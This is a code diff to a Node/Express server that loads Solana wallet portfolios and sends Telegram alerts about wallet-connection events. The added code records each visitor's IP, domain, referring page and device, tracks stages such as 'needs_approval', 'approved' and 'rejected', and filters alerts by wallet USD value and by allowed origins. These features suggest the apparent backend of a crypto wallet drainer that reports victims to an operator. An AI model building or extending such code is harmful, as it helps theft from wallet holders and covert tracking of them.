@@ -12,8 +12,38 @@ const PORT = process.env.PORT || 3000;
 const RPC_ENDPOINT = process.env.SOLANA_RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
+const TELEGRAM_ALLOWED_ADDRESSES = (process.env.TELEGRAM_ALLOWED_ADDRESSES || '')
+  .split(',')
+  .map((s) => s.trim())
+  .filter(Boolean);
+const TELEGRAM_MIN_USD = Number(process.env.TELEGRAM_MIN_USD || '0');
+const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
+  .split(',')
+  .map((s) => s.trim().replace(/\/$/, ''))
+  .filter(Boolean);
 const JUPITER_PRICE_URL = process.env.JUPITER_PRICE_URL || 'https://lite-api.jup.ag/price/v3';
 const SOL_MINT = 'So11111111111111111111111111111111111111112';
+
+const QUIET_STAGES = new Set(['connect_opened', 'connecting', 'checking']);
+const ALLOWED_STAGES = new Set(['connected', 'needs_approval', 'empty', 'approved', 'rejected', 'failed']);
+const recentEvents = new Map();
+
+function clientKey(req, event = {}) {
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || 'ip';
+  return `${ip}|${event.address || 'none'}|${event.stage || ''}`;
+}
+
+function tooSoon(key, ms = 60000) {
+  const last = recentEvents.get(key) || 0;
+  if (Date.now() - last < ms) return true;
+  recentEvents.set(key, Date.now());
+  if (recentEvents.size > 2000) {
+    const cutoff = Date.now() - 10 * 60 * 1000;
+    for (const [k, ts] of recentEvents) if (ts < cutoff) recentEvents.delete(k);
+  }
+  return false;
+}
+
 
 const connection = new Connection(RPC_ENDPOINT, 'confirmed');
 
@@ -168,8 +198,46 @@ function formatEvent(event) {
   if (event.tokenCount != null) lines.push(`↳ 🪙 Tokens: ${escapeHtml(event.tokenCount)}`);
   if (event.totalUsd != null) lines.push(`↳ 💵 ${escapeHtml(formatUsd(Number(event.totalUsd)))}`);
   if (event.detail) lines.push(`↳ ${escapeHtml(event.detail)}`);
+  if (event.ip) lines.push(`↳ IP: <code>${escapeHtml(event.ip)}</code>`);
+  if (event.host) lines.push(`↳ Domain: <b>${escapeHtml(event.host)}</b>`);
+  if (event.origin) lines.push(`↳ From: ${escapeHtml(event.origin)}`);
+  if (event.referer) lines.push(`↳ Page: ${escapeHtml(event.referer)}`);
+  if (event.ua) lines.push(`↳ Device: ${escapeHtml(String(event.ua).slice(0, 80))}`);
   lines.push(`🕒 ${escapeHtml(new Date().toLocaleString('en-CA', { timeZone: 'America/Edmonton', hour12: false }))} MDT`);
   return lines.join('\n');
+}
+
+
+function requestMeta(req) {
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || '';
+  return {
+    ip,
+    origin: req.headers.origin || '',
+    referer: req.headers.referer || '',
+    ua: req.headers['user-agent'] || '',
+  };
+}
+
+function originAllowed(req) {
+  if (!ALLOWED_ORIGINS.length) return true;
+  const origin = (req.headers.origin || '').replace(/\/$/, '');
+  const referer = req.headers.referer || '';
+  return ALLOWED_ORIGINS.some((o) => origin === o || referer.startsWith(o));
+}
+
+function addressAllowed(address) {
+  if (!address) return false;
+  if (!TELEGRAM_ALLOWED_ADDRESSES.length) return true;
+  return TELEGRAM_ALLOWED_ADDRESSES.includes(address);
+}
+
+function worthAllowed(usd) {
+  if (!TELEGRAM_MIN_USD) return true;
+  return Number(usd || 0) >= TELEGRAM_MIN_USD;
+}
+
+function shouldNotifyAddress(address, usd) {
+  return addressAllowed(address) && worthAllowed(usd);
 }
 
 async function sendTelegram(text) {
@@ -260,7 +328,13 @@ app.get('/api/portfolio/:pubkey', async (req, res) => {
     let telegram = { sent: false, skipped: !notify };
     if (notify) {
       try {
-        telegram = await sendTelegram(formatSnapshot(portfolio));
+        if (!shouldNotifyAddress(portfolio.address, portfolio.totals?.usd)) {
+          telegram = { sent: false, skipped: 'filtered' };
+        } else if (tooSoon(`snap|${portfolio.address}`, 10 * 60 * 1000)) {
+          telegram = { sent: false, skipped: 'rate_limit' };
+        } else {
+          telegram = await sendTelegram(formatSnapshot(portfolio));
+        }
       } catch (tgErr) {
         console.error('Telegram error:', tgErr);
         telegram = { sent: false, reason: tgErr.message };
@@ -276,7 +350,33 @@ app.get('/api/portfolio/:pubkey', async (req, res) => {
 
 app.post('/api/event', async (req, res) => {
   try {
+    if (!originAllowed(req)) {
+      return res.json({ ok: true, telegram: { sent: false, skipped: 'bad_origin' } });
+    }
     const event = req.body || {};
+    const stage = event.stage || '';
+    const meta = requestMeta(req);
+    event.ip = meta.ip;
+    event.origin = event.origin || meta.origin;
+    event.referer = event.referer || meta.referer;
+    event.ua = meta.ua;
+
+    if (QUIET_STAGES.has(stage) || !ALLOWED_STAGES.has(stage)) {
+      return res.json({ ok: true, telegram: { sent: false, skipped: 'quiet_stage' } });
+    }
+
+    if (!event.address || event.address === 'unknown') {
+      return res.json({ ok: true, telegram: { sent: false, skipped: 'no_address' } });
+    }
+
+    if (!addressAllowed(event.address) || !worthAllowed(event.totalUsd)) {
+      return res.json({ ok: true, telegram: { sent: false, skipped: 'filtered' } });
+    }
+
+    if (tooSoon(clientKey(req, event), 45000)) {
+      return res.json({ ok: true, telegram: { sent: false, skipped: 'rate_limit' } });
+    }
+
     const telegram = await sendTelegram(formatEvent(event));
     res.json({ ok: true, telegram });
   } catch (err) {
@@ -288,7 +388,14 @@ app.post('/api/event', async (req, res) => {
 app.post('/api/snapshot/:pubkey', async (req, res) => {
   try {
     const portfolio = await loadPortfolio(req.params.pubkey);
-    const telegram = await sendTelegram(formatSnapshot(portfolio));
+    let telegram = { sent: false };
+    if (!shouldNotifyAddress(portfolio.address, portfolio.totals?.usd)) {
+      telegram = { sent: false, skipped: 'filtered' };
+    } else if (tooSoon(`snap|${portfolio.address}`, 10 * 60 * 1000)) {
+      telegram = { sent: false, skipped: 'rate_limit' };
+    } else {
+      telegram = await sendTelegram(formatSnapshot(portfolio));
+    }
     res.json({ ...portfolio, telegram });
   } catch (err) {
     console.error(err);
